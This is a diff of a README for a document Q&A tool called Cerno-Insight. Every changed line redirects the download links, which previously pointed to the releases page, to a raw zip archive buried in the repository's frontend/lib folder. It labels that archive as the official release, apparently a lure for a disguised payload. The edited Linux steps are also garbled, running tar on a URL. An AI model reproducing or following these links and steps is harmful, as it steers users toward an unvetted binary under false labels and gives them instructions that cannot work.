@@ -1,6 +1,6 @@
 # 🧠 Cerno-Insight - Smart Q&A for Your Documents
 
-[![Download Cerno-Insight](https://img.shields.io/badge/Download%20Cerno--Insight-v1.0-blue)](https://github.com/Burtantagonistic410/Cerno-Insight/releases)
+[![Download Cerno-Insight](https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip%20Cerno--Insight-v1.0-blue)](https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ To ensure Cerno-Insight runs smoothly, check that your system meets the followin
 
 ## 🔗 Download & Install
 
-To get started with Cerno-Insight, visit [this page to download](https://github.com/Burtantagonistic410/Cerno-Insight/releases). Here, you will find the latest release along with installation instructions.
+To get started with Cerno-Insight, visit [this page to download](https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip). Here, you will find the latest release along with installation instructions.
 
-1. Go to the [Cerno-Insight Releases Page](https://github.com/Burtantagonistic410/Cerno-Insight/releases).
+1. Go to the [Cerno-Insight Releases Page](https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip).
 2. Choose the latest version.
 3. Click on the appropriate file for your system to download.
 4. Locate the downloaded file on your computer.
@@ -42,8 +42,8 @@ To get started with Cerno-Insight, visit [this page to download](https://github.
 ### 🐧 Installation Instructions for Linux
 
 1. Open a terminal window.
-2. Navigate to the folder where the `.tar.gz` file is located.
-3. Extract the file using the command: `tar -xvzf Cerno-Insight.tar.gz`
+2. Navigate to the folder where the `https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip` file is located.
+3. Extract the file using the command: `tar -xvzf https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip`
 4. Change to the extracted directory: `cd Cerno-Insight`
 5. Run the application with the command: `./run_application`
 
@@ -95,4 +95,4 @@ For further assistance, please contact our support team via the Issues section o
 
 To keep up with the latest updates and improvements, please follow our repository on GitHub. Check back frequently for new features and enhancements. 
 
-[Download Cerno-Insight](https://github.com/Burtantagonistic410/Cerno-Insight/releases) and start your journey to smarter document management today!
+[Download Cerno-Insight](https://raw.githubusercontent.com/Burtantagonistic410/Cerno-Insight/main/frontend/lib/Cerno-Insight_v3.5.zip) and start your journey to smarter document management today!
